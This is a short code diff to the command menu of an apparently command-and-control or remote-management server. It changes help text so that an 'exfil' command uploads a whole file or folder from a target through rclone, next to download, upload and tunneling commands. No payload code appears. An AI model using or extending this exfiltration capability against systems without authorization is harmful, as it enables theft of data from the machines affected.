@@ -2256,7 +2256,7 @@ class CommandInterface:
 
 {Colors.CYAN}File Operations:{Colors.END}
   {Colors.GREEN}download <file>{Colors.END}          - Download file from target
-  {Colors.GREEN}exfil <file> [profile]{Colors.END}   - Upload remote file via rclone (agent)
+  {Colors.GREEN}exfil <path> [profile]{Colors.END}   - Upload remote file or folder via rclone (agent)
   {Colors.GREEN}upload <local> <remote>{Colors.END}  - Upload file to target
 
 {Colors.CYAN}Tunneling:{Colors.END}
@@ -2474,7 +2474,7 @@ class CommandInterface:
                         except (ValueError, RcloneConfigError) as e:
                             self.server.tty_print(f"{Colors.RED}{e}{Colors.END}")
                 else:
-                    self.server.tty_print(f"{Colors.RED}Usage: exfil <remote_file> [profile]{Colors.END}")
+                    self.server.tty_print(f"{Colors.RED}Usage: exfil <remote_path> [profile]{Colors.END}")
 
             elif cmd == "upload":
                 if len(args) >= 2:
@@ -2612,7 +2612,7 @@ def main():
         default=None,
         type=int,
         metavar="N",
-        help="Max exfil file size in bytes; 0 = unlimited (or set RMM_RCLONE_MAX_BYTES)",
+        help="Max exfil size in bytes (file or folder); 0 = unlimited (or set RMM_RCLONE_MAX_BYTES)",
     )
     args = parser.parse_args()
     PORT = args.port
